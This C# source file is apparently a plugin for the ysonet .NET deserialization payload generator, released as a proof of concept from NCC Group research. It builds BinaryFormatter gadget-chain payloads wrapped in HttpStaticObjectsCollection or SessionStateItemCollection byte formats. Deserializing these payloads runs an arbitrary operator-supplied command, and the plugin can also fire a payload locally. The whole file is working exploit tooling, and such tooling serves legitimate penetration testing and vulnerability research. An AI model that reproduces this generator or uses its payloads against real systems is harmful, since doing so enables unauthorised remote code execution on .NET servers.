using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `HttpStaticObjectsCollection.Deserialize(BinaryReader) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.web.httpstaticobjectscollection.deserialize and 
 *      `SessionStateItemCollection.Item[String] Property`: https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionstateitemcollection.item 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  The affected modules accept input type of BinaryReader
 **/

namespace ysonet.Plugins
{
    public class AltserializationPlugin : IPlugin
    {
        // The gadget each mode wrapped before -g existed. They differ, so the default is
        // resolved per mode after parsing rather than in the field initializer. Keeping
        // them means no existing command line changes what it produces.
        const string DefaultSessionStateGadget = "TypeConfuseDelegate";
        const string DefaultStaticObjectsGadget = "TextFormattingRunProperties";

        static string format = "";
        static string mode = "";
        static string command = "";
        static string gadget = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;
        static bool dosAcknowledged = false;
        static bool legacyFx = false;

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: HttpStaticObjectsCollection or SessionStateItemCollection. Default: {default}", v => mode = v },
                {"o|output=", "the output format (raw|base64).", v => format = v },
                {"c|command=", "the command to be executed", v => command = v },
                // No single metadata default: the selected mode resolves its own gadget.
                {"g|gadget=", "a gadget chain that supports BinaryFormatter. Leave it empty to use the gadget each mode has always used: " + DefaultStaticObjectsGadget + " for HttpStaticObjectsCollection, " + DefaultSessionStateGadget + " for SessionStateItemCollection.", v => gadget = v },
                {"t|test", "whether to run payload locally. Default: {default}", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: {default}", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: {default}", v => useSimpleType =  v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                {"legacyfx", "Target the .NET Framework 2.0/3.0/3.5 (CLR v2) generation. This reaches the GADGET only; both wire frames this plugin writes name no framework assembly, so they need no rewriting. Default: {default}", v => legacyFx = v != null },
                {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
            }
            .WithMetadata("mode", new OptionMetadata(defaultValue: "HttpStaticObjectsCollection", choices: new[] { "HttpStaticObjectsCollection", "SessionStateItemCollection" }))
            .WithMetadata("output", new OptionMetadata(choices: new[] { "raw", "base64" }))
            .WithMetadata("command", new OptionMetadata(required: true))
            .WithMetadata("gadget", new OptionMetadata(valueSource: OptionValueSource.Gadgets))
            .WithMetadata("test", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("minify", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("usesimpletype", new OptionMetadata(defaultValue: "true"))
            .WithMetadata("rawcmd", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("legacyfx", new OptionMetadata(defaultValue: "false"))
            .WithMetadata("i-understand-dos", new OptionMetadata(defaultValue: "false"));

        public string Name()
        {
            return "Altserialization";
        }

        public string Description()
        {
            return "Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        // A public plugin: it is listed everywhere, with or without --display-private.
        public bool IsPrivate() { return false; }

        // Measured at BOTH ends: the LEGACY tier fires this plugin on real CLR-v2 children
        // (2.0/3.0/3.5 lanes, raw and minified), and the execution matrix observes it on
        // this machine's 4.8.1 build.
        //
        // Declared as a CONTIGUOUS range rather than just those endpoints, and that is a
        // correctness point rather than a style one. A HOLE inside a declared span is not
        // "unmeasured", it is an active EXCLUSION: ClassifyVersionEvidence returns
        // Contradiction for an observation inside the hole, and its own unit test spells
        // that out ("the gadget positively says it does not work there"). So declaring
        // {2.0,3.0,3.5,4.8.1} would FAIL the suite on any 4.0-4.8 machine the moment the
        // execution matrix fired this plugin there - a red build for a contributor whose
        // box is 4.8 rather than 4.8.1, reporting a claim that was never intended.
        //
        // ObjRef and TempFileCollection carry the identical evidence shape (CLR-v2 lanes
        // plus 4.8.1) and both declare Range(NetFx20, NetFx481) for the same reason.
        public List<string> RuntimeVersions()
        {
            return new List<string>(RuntimeVersion.Range(
                RuntimeVersion.NetFx20, RuntimeVersion.NetFx481));
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            // Reset EVERY option so an in-process prior run cannot leak into this one.
            // A partial reset is worse than none: -g and -M in particular would stick,
            // and the next caller would silently get the previous run's gadget or mode.
            format = "";
            mode = "";
            command = "";
            gadget = "";
            test = false;
            minify = false;
            useSimpleType = true;
            rawcmd = false;
            dosAcknowledged = false;
            legacyFx = false;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.DosAcknowledged = dosAcknowledged;
                // Reaches the inner gadget's generation boundary only. Neither wire frame
                // this plugin writes names a framework assembly.
                inputArgs.LegacyFx = legacyFx;
                // NOT inputArgs.Test. -t on this plugin means "run the collection
                // deserialize PoC below", and the payload must be built without firing
                // itself first.
                inputArgs.Test = false;
                // Anything this plugin did not recognise belongs to the gadget the user
                // chose with -g, so it is forwarded rather than dropped. Without this a
                // gadget option typed on a plugin command line (--var, for example) goes
                // nowhere and the operator silently gets the default variant. Only the
                // LEFTOVER args travel: an option this plugin declares was already
                // consumed by the parse above, so the two cannot collide.
                inputArgs.ExtraArguments = extra;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }

            object payload = "";
            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            bool isSessionState = mode.ToLower().Equals("sessionstateitemcollection");

            // -g is optional and the two modes historically wrapped different gadgets, so
            // an unset -g means "whatever this mode always used".
            string effectiveGadget = String.IsNullOrEmpty(gadget)
                ? (isSessionState ? DefaultSessionStateGadget : DefaultStaticObjectsGadget)
                : gadget;

            if (isSessionState)
            {
                // The object path below hands a live gadget OBJECT to System.Web, which only
                // the default gadget can supply (IGenerator returns SERIALIZED bytes, never a
                // graph). So a user-chosen gadget takes the byte-splice path, which works for
                // any BinaryFormatter blob. The default gadget with no --minify keeps the
                // object path so its shipped bytes are unchanged.
                bool useSplicePath = inputArgs.Minify
                    || !String.Equals(effectiveGadget, DefaultSessionStateGadget,
                        StringComparison.OrdinalIgnoreCase);

                if (useSplicePath)
                {
                    // Splice path. The object path below hands the gadget OBJECT to System.Web,
                    // whose SessionStateItemCollection.Serialize uses the stock BinaryFormatter and
                    // therefore ignores --minify. To honor it, take the BinaryFormatter blob
                    // directly and splice it into the SessionStateItemCollection wire format: store the
                    // blob as a byte[] value (its raw bytes go in verbatim), then flip the value's type
                    // marker to 20 so AltSerialization.ReadValueFromStream BF-deserializes those bytes
                    // on read, reaching the same gadget as the object path. The framing offsets are
                    // fixed by the empty key and the byte[] header (independent of the blob length), so
                    // the magic numbers hold for any blob, which is also what lets any -g gadget
                    // use this path.
                    Helpers.Core.RunResult spliceResult =
                        Helpers.Core.PayloadRunner.GeneratePluginGadget(effectiveGadget, "BinaryFormatter", inputArgs);
                    if (!spliceResult.Success)
                    {
                        Console.WriteLine(spliceResult.ErrorMessage);
                        throw new Exception(spliceResult.ErrorMessage);
                    }
                    foreach (string warning in spliceResult.Warnings)
                        Console.Error.WriteLine(warning);
                    byte[] bfBytes = (byte[])spliceResult.Raw;
                    byte[] tempPayload = new byte[bfBytes.Length + 1]; // one trailing byte fixes the length
                    bfBytes.CopyTo(tempPayload, 0);
                    System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                    items[""] = tempPayload;
                    MemoryStream stream = new MemoryStream();
                    BinaryWriter writer = new BinaryWriter(stream);
                    items.Serialize(writer);
                    stream.Flush();
                    tempPayload = stream.ToArray();
                    byte[] newSerializedData = new byte[tempPayload.Length - 27 - 1 - 1];
                    Array.Copy(tempPayload, 0, newSerializedData, 0, 9); // first 9 bytes: collection header
                    Array.Copy(tempPayload, 36, newSerializedData, 9, tempPayload.Length - 27 - 1 - 9 - 1); // skip 27 bytes of byte[] framing, copy the blob, drop the trailing byte
                    newSerializedData[13] = 20; // value type 20 -> ReadValueFromStream BF-deserializes the blob
                    payload = newSerializedData;
                }
                else
                {
                    // Object path: hand the gadget OBJECT to System.Web and let it serialize with the
                    // stock BinaryFormatter. Clean, but cannot honor --minify and cannot carry a
                    // user-chosen gadget (hence the branch above). Reached only by the default
                    // gadget with no --minify, so these are the bytes this mode always shipped.
                    object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
                    System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                    items[""] = serializedData;
                    MemoryStream stream = new MemoryStream();
                    BinaryWriter writer = new BinaryWriter(stream);
                    items.Serialize(writer);
                    stream.Flush();
                    payload = stream.ToArray();
                }

                if (test)
                {
                    // PoC on how it works in practice
                    MemoryStream stream = new MemoryStream((byte[])payload);
                    BinaryReader binReader = new BinaryReader(stream);
                    System.Web.SessionState.SessionStateItemCollection test = System.Web.SessionState.SessionStateItemCollection.Deserialize(binReader);
                    test.GetEnumerator();
                }
            }
            else
            {
                // HttpStaticObjectsCollection. This frame carries the BinaryFormatter blob
                // verbatim, so any -g gadget that supports BinaryFormatter fits it.
                Helpers.Core.RunResult gadgetResult =
                    Helpers.Core.PayloadRunner.GeneratePluginGadget(effectiveGadget, "BinaryFormatter", inputArgs);
                if (!gadgetResult.Success)
                {
                    Console.WriteLine(gadgetResult.ErrorMessage);
                    throw new Exception(gadgetResult.ErrorMessage);
                }
                foreach (string warning in gadgetResult.Warnings)
                    Console.Error.WriteLine(warning);

                byte[] serializedData = (byte[])gadgetResult.Raw;
                byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                serializedData.CopyTo(newSerializedData, 7);
                newSerializedData[0] = 1; // for ReadInt32
                newSerializedData[5] = 1; // for ReadBoolean
                newSerializedData[6] = 20; // for ReadByte - 20 is the type that will be deserialized in AltSerialization.ReadValueFromStream

                payload = newSerializedData;

                if (test)
                {
                    // PoC on how it works in practice
                    try
                    {
                        MemoryStream stream = new MemoryStream((byte[])payload);
                        BinaryReader binReader = new BinaryReader(stream);
                        System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
            }

            return payload;
        }
    }
}
